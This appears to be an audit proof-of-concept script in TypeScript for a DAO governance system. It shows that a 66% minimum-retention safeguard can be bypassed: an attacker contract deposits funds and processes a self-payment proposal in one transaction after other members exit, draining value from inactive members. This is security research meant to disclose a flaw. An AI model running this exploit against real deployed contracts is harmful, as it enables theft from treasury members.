/**
 * GOV-03 — minRetention (66%) is bypassed by a deposit in the same transaction as processProposal.
 *
 * Invariant that should hold (DESIGN.md §3.3, constitution): if more than 34% of shares exit during
 * vote + grace the proposal fails ("the other nodes disagreed with their feet"), which protects the
 * members who stayed.
 *
 * Why it fails: Baal checks `totalSupply() >= 66% x high-water mark` at processing time, and
 * DepositShaman.deposit is open and instant, so the proposer refills supply with a deposit and
 * processes in the same transaction; the payment it voted itself then returns the deposit.
 *
 * Steps: seed → the attacker is a CONTRACT member M (1000 USDC deposit) → M proposes "Safe pays M
 * 2000 USDC", votes YES (1000 vs 0) → B and C (2000 of 4050 shares = 49.4%) ragequit during grace
 * → without the trick processProposal fails (shown on a snapshot) → M deposits 987 USDC and
 * processes in ONE transaction → paid 2000. F (50 shares, asleep) and A (1000, asleep) are left
 * with a pro-rata of what remains.
 */
import { encodeFunctionData } from "viem";

import { assert, boot, fmt, fmtS, fund, processProposal, proposalInfo, ragequit, runIfMain, seedMembers, SETTLEMENT_UNIT, shutdown, snapshot, stateOf, step, transferCall, usdcOf, verdict, warp, warpPastGrace, warpPastVoting } from "../../../scenarios/lib.js";
import { approveCall, depositCall, deployHelper, logLine, pct2, processCall, revertChain, runCalls, safeUsdc, sharesOf, snapshotChain, submitCall, totalShares, transferUsdcCall, voteCall } from "./audit-lib.js";

const LOG = "t03-retention-bypass-deposit-at-processing";

/**
 * Run GOV-03 on a fresh mirror.
 *
 * Raises:
 *   Error: when the demonstrated outcome differs from the description above.
 */
export async function main(): Promise<void> {
  const mirror = await boot("audit-t03");
  let passed = false;
  try {
    await seedMembers(mirror);
    step("attacker M = a contract member: D funds it with 2000 USDC, it deposits 1000 USDC at NAV");
    const helper = await deployHelper(mirror, "D");
    const M = helper.address;
    await fund(mirror, "D", 2_000n * SETTLEMENT_UNIT);
    await mirror.actors.D.walletClient.writeContract({ address: mirror.dao.settlement, abi: mirror.abi.settlement, functionName: "transfer", args: [M, 2_000n * SETTLEMENT_UNIT], account: mirror.actors.D.account, chain: mirror.actors.D.chain } as never);
    await runCalls(mirror, "D", helper, [approveCall(mirror, mirror.dao.depositShaman, 1_000n * SETTLEMENT_UNIT), depositCall(mirror, 1_000n * SETTLEMENT_UNIT)], "M approve + deposit 1000 USDC");
    const mStart = await usdcOf(mirror, M);
    logLine(LOG, `   M shares ${fmt(await sharesOf(mirror, M))} of ${fmt(await totalShares(mirror))}; Safe ${fmtS(await safeUsdc(mirror))} USDC; M USDC ${fmtS(mStart)}`);

    step("M proposes 'Safe pays M 2000 USDC' (self-sponsored) and votes YES; nobody votes NO");
    const pay = 2_000n * SETTLEMENT_UNIT;
    const submit = submitCall(mirror, [transferCall(mirror, M, pay)], "M: pay M 2000 USDC");
    await runCalls(mirror, "D", helper, [submit], "M submitProposal");
    const id = Number(await mirror.chain.publicClient.readContract({ address: mirror.dao.baal, abi: mirror.abi.baal, functionName: "proposalCount" } as never));
    await warp(mirror, 1, "let votingStarts become past");
    await runCalls(mirror, "D", helper, [voteCall(mirror, id, true)], `M votes YES on #${id}`);
    const proposal = { id, data: submit.proposalData, submit: { hash: "0x" as const, blockNumber: 0n, gasUsed: 0n } };
    const hwm = await totalShares(mirror);
    logLine(LOG, `   #${id}: yes ${fmt((await proposalInfo(mirror, id)).yesVotes)} no 0; high-water mark ${fmt(hwm)} shares; 66% = ${fmt((hwm * 66n) / 100n)}`);

    step("B and C disagree with their feet: both ragequit during grace (2000 of 4050 shares = 49.4% > 34%)");
    await warpPastVoting(mirror, id);
    await ragequit(mirror, "B");
    await ragequit(mirror, "C");
    const supplyAfterExits = await totalShares(mirror);
    const safeAfterExits = await safeUsdc(mirror);
    logLine(LOG, `   supply ${fmt(supplyAfterExits)} < ${fmt((hwm * 66n) / 100n)} (66% of HWM): the proposal should now fail; Safe ${fmtS(safeAfterExits)} USDC`);
    assert(supplyAfterExits < (hwm * 66n) / 100n, "exits exceed 34% of the high-water mark");
    await warpPastGrace(mirror, id);
    assert((await stateOf(mirror, id)) === "Ready", "state is Ready (yes > no); retention is only checked inside processProposal");

    step("control (snapshot): plain processProposal -> passed = false, nothing moves");
    const snap = await snapshotChain(mirror);
    const plain = await processProposal(mirror, "W", proposal);
    logLine(LOG, `   control: passed=${plain.info.status.passed} actionFailed=${plain.info.status.actionFailed} Safe ${fmtS(await safeUsdc(mirror))} M USDC ${fmtS(await usdcOf(mirror, M))}`);
    assert(!plain.info.status.passed, "control: minRetention defeats the proposal when nobody tops the supply up");
    await revertChain(mirror, snap);

    step("attack: M deposits just enough to lift supply back to 66% of the HWM and processes in the SAME transaction");
    const need = (hwm * 66n) / 100n - supplyAfterExits; // shares
    const price = safeAfterExits; // NAV: shares = amount * supply / treasury
    const amount = (need * price + supplyAfterExits - 1n) / supplyAfterExits + 1n; // ceil + 1 unit
    const receipt = await runCalls(mirror, "D", helper, [approveCall(mirror, mirror.dao.depositShaman, amount), depositCall(mirror, amount), processCall(mirror, id, submit.proposalData)], `M deposit ${fmtS(amount)} USDC + processProposal #${id}`);
    const info = await proposalInfo(mirror, id);
    const mEnd = await usdcOf(mirror, M);
    const safeEnd = await safeUsdc(mirror);
    const supplyEnd = await totalShares(mirror);
    logLine(LOG, `   one tx ${receipt.hash}: passed=${info.status.passed} actionFailed=${info.status.actionFailed}; Safe ${fmtS(safeAfterExits)} -> ${fmtS(safeEnd)} USDC; M USDC ${fmtS(mStart)} -> ${fmtS(mEnd)} (net ${fmtS(mEnd - mStart)} plus ${fmt(await sharesOf(mirror, M))} shares)`);
    assert(info.status.passed && !info.status.actionFailed, "the proposal passed and paid although > 34% of shares had exited");
    for (const actor of ["F", "A"] as const) {
      const shares = await sharesOf(mirror, mirror.actors[actor].account.address);
      const before = (shares * safeAfterExits) / supplyAfterExits;
      const after = (shares * safeEnd) / supplyEnd;
      logLine(LOG, `   sleeping ${actor}: ${fmt(shares)} shares worth ${fmtS(before)} -> ${fmtS(after)} USDC (${pct2(before - after, before)} lost)`);
    }
    logLine(LOG, `   attacker cost: gas + ${fmtS(amount)} USDC inside one transaction (flash-loanable); the payment repays it`);
    await snapshot(mirror, "end", ["F", "A", "B", "C"]);
    passed = true;
  } finally {
    verdict("GOV-03 minRetention bypassed by deposit + process in one transaction (finding demonstrated)", passed);
    await shutdown(mirror);
  }
}

runIfMain(import.meta.url, main);
